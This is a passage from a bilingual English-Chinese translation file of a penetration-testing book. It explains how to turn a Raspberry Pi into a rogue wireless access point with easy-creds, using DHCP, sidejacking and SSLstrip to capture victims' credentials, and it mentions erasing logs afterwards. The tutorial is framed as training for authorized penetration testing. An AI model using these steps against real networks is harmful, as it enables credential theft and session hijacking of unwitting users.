  zh: 在下面的示例中，我们将创建一个伪装的接入蜜罐，它将充当一个伪装的无线接入点，旨在在受害者连接到它以访问互联网时捕获敏感信息。我们将把`eth0`端口连接到面向互联网的端口，并利用USB无线适配器来托管伪装的无线服务。攻击可以使用无线来修改互联网和伪装的无线接口；但是，我们需要两个USB无线适配器才能完成此操作。只要在发动攻击之前设置了VPN连接，攻击者就可以从任何地方访问树莓派蜜罐。下面的图表显示了我们将要构建的内容：
- en: '![Rogue access honeypots](img/Insert6435OT_04_27.jpg)'
  id: totrans-151
  prefs: []
  type: TYPE_IMG
  zh: '![Rogue access honeypots](img/Insert6435OT_04_27.jpg)'
- en: Let's look at a popular utility known as easy-creds and use it to build a Raspberry
    Pi rogue access honeypot.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看一个名为easy-creds的流行实用程序，并使用它来构建一个树莓派伪装接入蜜罐。
- en: Easy-creds
  id: totrans-153
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Easy-creds
- en: Easy-creds is a bash script that leverages Ettercap and other tools to obtain
    credentials. Ettercap was covered in [Chapter 3](ch03.html "Chapter 3. Penetration
    Testing"), *Penetration Testing*. However, easy-creds takes the man-in-the-middle
    attack further by providing you with all the tools you need to develop a monitoring
    honeypot. Easy-creds is menu-driven and offers ARP spoofing, **Dynamic Host Configuration
    Protocol** (**DHCP**) spoofing, one-way ARP spoofing, and creating a fake **Access
    Point** (**AP**).
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: Easy-creds是一个利用Ettercap和其他工具获取凭据的bash脚本。Ettercap在[第3章](ch03.html "第3章。渗透测试")*渗透测试*中有介绍。然而，easy-creds通过为您提供开发监视蜜罐所需的所有工具，将中间人攻击推进了一步。Easy-creds是菜单驱动的，并提供ARP欺骗、**动态主机配置协议**（**DHCP**）欺骗、单向ARP欺骗和创建虚假**接入点**（**AP**）。
- en: Easy-creds does not come preinstalled on the Raspberry Pi, so you will need
    to download it from [http://sourceforge.net/projects/easy-creds/files/latest/download](http://sourceforge.net/projects/easy-creds/files/latest/download).
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: Easy-creds未预装在树莓派上，因此您需要从[http://sourceforge.net/projects/easy-creds/files/latest/download](http://sourceforge.net/projects/easy-creds/files/latest/download)下载它。
- en: 'Once it is downloaded, navigate to the download directory (normally `Downloads`)
    using `cd Downloads` as shown in the following screenshot:'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 下载完成后，使用`cd Downloads`导航到下载目录（通常为`Downloads`），如下截图所示：
- en: '![Easy-creds](img/Insert6435OT_04_28.jpg)'
  id: totrans-157
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_28.jpg)'
- en: 'You will need to uncompress the files that you downloaded by issuing the `tar
    –zxvf easy-*` command. This will create a new directory that you will be able
    to see using the `ls` command. Open that directory with the `cd` command and you
    should see an install script using the `ls` command. You will need to make the
    install script an executable file either using the `chmod +x installer.sh` command
    or the `chmod 777 installer.sh` command. The following screenshot shows the execution
    of the previous steps:'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 您需要通过发出`tar –zxvf easy-*`命令来解压下载的文件。这将创建一个新目录，您可以使用`ls`命令查看。使用`cd`命令打开该目录，您应该可以看到一个安装脚本。您需要使用`chmod
    +x installer.sh`命令或`chmod 777 installer.sh`命令将安装脚本设置为可执行文件。下面的截图显示了前面步骤的执行：
- en: '![Easy-creds](img/Insert6435OT_04_29.jpg)'
  id: totrans-159
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_29.jpg)'
- en: 'Once you have created the executable file, issue the `./installer.sh` command
    to install easy-creds. The following screenshot shows the installation menu that
    will appear once you run the easy-creds install script:'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 创建可执行文件后，使用`./installer.sh`命令安装easy-creds。运行easy-creds安装脚本后将出现安装菜单，如下截图所示：
- en: '![Easy-creds](img/Insert6435OT_04_30.jpg)'
  id: totrans-161
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_30.jpg)'
- en: Since we are running this on Kali Linux, we will select **1\. Debian/Ubuntu
    and derivatives** from the menu.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们在Kali Linux上运行，我们将从菜单中选择**1. Debian/Ubuntu和衍生产品**。
- en: 'You will need to follow the prompts to complete the installation. When the
    installation is complete, you can launch easy-creds by issuing the `./easy-creds.sh`
    command. The following screenshot shows the commands to run easy-creds once it
    is installed:'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 您需要按照提示完成安装。安装完成后，可以通过发出`./easy-creds.sh`命令来启动easy-creds。下面的截图显示了安装后运行easy-creds的命令：
- en: '![Easy-creds](img/Insert6435OT_04_31.jpg)'
  id: totrans-164
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_31.jpg)'
- en: Once you run the `.sh` file, you will see the easy-creds menu. Easy-creds often
    changes the order of the menu slightly in each version, so your menu may look
    different than the following screenshot. In our example, we are going to select
    **1\. Prerequisites & Configurations** for configurations.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 运行`.sh`文件后，您将看到easy-creds菜单。Easy-creds经常在每个版本中略微更改菜单的顺序，因此您的菜单可能与以下截图不同。在我们的示例中，我们将选择**1.
    先决条件和配置**进行配置。
- en: '![Easy-creds](img/Insert6435OT_04_32.jpg)'
  id: totrans-166
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_32.jpg)'
- en: The first step to set up our honeypot is to make sure that we hand out IP addresses
    used for the attack to our victims. To do this, we will install a DHCP server.
    You might get an error while installing the DHCP server, which would mean that
    you already have one installed from another exercise or a tool that you previously
    installed.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 设置我们的蜜罐的第一步是确保我们向受害者分配用于攻击的IP地址。为此，我们将安装DHCP服务器。在安装DHCP服务器时可能会出现错误，这意味着您可能已经从其他练习或之前安装的工具中安装了DHCP服务器。
- en: 'The following screenshot of the configuration menu shows that **3\. Install
    dhcp server** is used to install a DHCP server:'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 配置菜单的下面截图显示了使用**3. 安装dhcp服务器**来安装DHCP服务器：
- en: '![Easy-creds](img/Insert6435OT_04_33.jpg)'
  id: totrans-169
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_33.jpg)'
- en: Once the DHCP server is installed, we will select **Add tunnel interface to
    dhcp server**. In the previous screenshot, this was option **5.**
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 安装DHCP服务器后，我们将选择**添加隧道接口到dhcp服务器**。在上一个截图中，这是选项**5**。
- en: 'Next, scroll down to the part of the configuration that states which interface
    the DHCP server should listen on. You will need to manually type in `wlan0` here,
    as shown in the following screenshot, if your wireless network is using this interface:'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，滚动到配置的部分，指定DHCP服务器应该监听的接口。如果你的无线网络使用这个接口，你需要在这里手动输入`wlan0`，就像下面的截图中所示：
- en: '![Easy-creds](img/Insert6435OT_04_34.jpg)'
  id: totrans-172
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_34.jpg)'
- en: 'Once you finish adding your wireless interface, choose to go back to the previous
    menu. This was **9\. Previous Menu** in the configuration menu screenshot. Now,
    let''s set up a FakeAP attack using **3\. FakeAP Attacks**, as shown in the following
    screenshot:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 添加完无线接口后，选择返回到上一个菜单。在配置菜单截图中，这是**9. 上一个菜单**。现在，让我们使用**3. 伪造AP攻击**来设置FakeAP攻击，就像下面的截图中所示：
- en: '![Easy-creds](img/Insert6435OT_04_35.jpg)'
  id: totrans-174
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_35.jpg)'
- en: 'Next, you will be presented with several options. For our example, we will
    select the **FakeAP Attack Static** option shown as **1.** in the following screenshot:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，你将看到几个选项。对于我们的示例，我们将选择**伪造AP攻击静态**选项，如下面截图中所示的**1.**：
- en: '![Easy-creds](img/Insert6435OT_04_36.jpg)'
  id: totrans-176
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_36.jpg)'
- en: You will be prompted to choose whether you would like to include a sidejacking
    attack. **Sidejacking** describes the act of hijacking an engaged web session
    by using the credentials that identified the victim to a specific server. This
    can be useful when people access our honeypot and log in to a website. So, for
    our example, we will select **Yes** for this option.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 你将被提示选择是否包括sidejacking攻击。**Sidejacking**描述了通过使用识别受害者对特定服务器的凭据来劫持已经建立的网络会话。当人们访问我们的蜜罐并登录网站时，这可能会有用。因此，对于我们的示例，我们将选择**是**。
- en: Next, you will be asked to select the interface that is connected to the Internet.
    In most cases, this will be `eth0`, which means that the design is having the
    Raspberry Pi offer the rogue wireless attack from interface `wlan0` and passing
    traffic through to the Internet from a LAN connection on `eth0`. You can also
    use two USB to wireless adapters for this, in which you can connect one to the
    Internet and host the rogue wireless attack from the other. The problem with this
    approach is that both the trusted and fake wireless access points will be broadcasting
    connections unless the real wireless network is not broadcasted, for example using
    a cellphone in tether mode. We will stick with using a LAN connection for our
    example.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，你将被要求选择连接到互联网的接口。在大多数情况下，这将是`eth0`，这意味着设计是让树莓派从接口`wlan0`提供伪造无线攻击，并通过`eth0`上的LAN连接传递流量到互联网。你也可以使用两个USB无线适配器来实现这一点，其中一个连接到互联网，另一个用于主机伪造无线攻击。这种方法的问题在于，受信任和伪造的无线接入点都将广播连接，除非真实的无线网络没有广播，例如使用手机的共享模式。我们将使用LAN连接作为示例。
- en: After you select the Internet interface, you will be prompted to fill out a
    few other details such as where you would like to save the logfiles and the DHCP
    address space. Fill these out and you will be finished with the basic configuration.
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 选择完互联网接口后，你将被提示填写一些其他细节，比如你想保存日志文件的位置和DHCP地址空间。填写这些信息后，基本配置就完成了。
- en: You will now have an active rogue wireless honeypot advertising itself to clients
    to join. If a client accesses the network and uses clear text protocols, their
    information will be captured and displayed in easy-creds. Easy-creds will also
    attempt to use SSLstrip to redirect users to unencrypted web pages if they attempt
    to open an HTTPS website. We covered SSLstrip in [Chapter 3](ch03.html "Chapter 3. Penetration
    Testing"), *Penetration Testing*.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 现在你将拥有一个主动的伪造无线蜜罐，向客户端广告自己加入。如果客户端访问网络并使用明文协议，他们的信息将被捕获并显示在easy-creds中。如果他们尝试打开HTTPS网站，easy-creds还将尝试使用SSLstrip将用户重定向到未加密的网页。我们在[第3章](ch03.html
    "第3章 渗透测试")*渗透测试*中介绍了SSLstrip。
- en: 'The following screenshot depicts a set of screenshots showing our honeypot
    capturing a victim''s Facebook login credentials when they use our rogue wireless
    network:'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图显示了一组截图，展示了我们的蜜罐在受害者使用我们的伪造无线网络时捕获其Facebook登录凭据：
- en: '![Easy-creds](img/Insert6435OT_04_37.jpg)'
  id: totrans-182
  prefs: []
  type: TYPE_IMG
  zh: '![Easy-creds](img/Insert6435OT_04_37.jpg)'
- en: Your Raspberry Pi is now a fully functional rogue access honeypot that is saving
    captured passwords into the logfile that you specified during the configuration.
    You can access this log remotely for your final penetration test report. You can
    find more on easy-creds at [http://sourceforge.net/projects/easy-creds/](http://sourceforge.net/projects/easy-creds/).
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 你的树莓派现在是一个完全功能的伪造访问蜜罐，将捕获的密码保存到你在配置过程中指定的日志文件中。你可以远程访问这个日志，用于最终的渗透测试报告。你可以在[http://sourceforge.net/projects/easy-creds/](http://sourceforge.net/projects/easy-creds/)找到更多关于easy-creds的信息。
- en: Summary
  id: totrans-184
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: This chapter focused on running active attacks from the Raspberry Pi once you
    have breached a network. Topics included compromising systems with various forms
    of payloads, social engineering techniques, exploiting browsers, and developing
    rogue access honeypots with the purpose of gaining access through vulnerabilities
    or by stealing user credentials. At this point, we have covered the basics for
    performing a penetration test with a Raspberry Pi. There are more concepts to
    learn; however, the topics covered so far will give you a general idea of how
    to use your Raspberry Pi for an authorized penetration test.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 本章重点介绍了一旦你侵入网络后，如何在树莓派上运行主动攻击。主题包括使用各种形式的载荷来妥协系统、社会工程技术、利用浏览器以及开发伪造访问蜜罐，目的是通过漏洞或窃取用户凭据来获取访问权限。到目前为止，我们已经介绍了使用树莓派进行渗透测试的基础知识。还有更多的概念需要学习，但到目前为止涵盖的主题将给你一个如何使用树莓派进行授权渗透测试的一般概念。
- en: The next chapter will look at what to do once you finish your penetration test.
    This includes how to clean up logfiles and erase your footprint in a secure manner
    to avoid leaving forensic evidence. We will also cover steps to capture data that
    can be used to develop a professional penetration test deliverable showcasing
    the value of your services.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 下一章将讨论在完成渗透测试后该做什么。这包括如何清理日志文件并以安全的方式擦除您的足迹，以避免留下法证证据。我们还将介绍捕获数据的步骤，这些数据可以用来开发专业的渗透测试成果展示您的服务的价值。
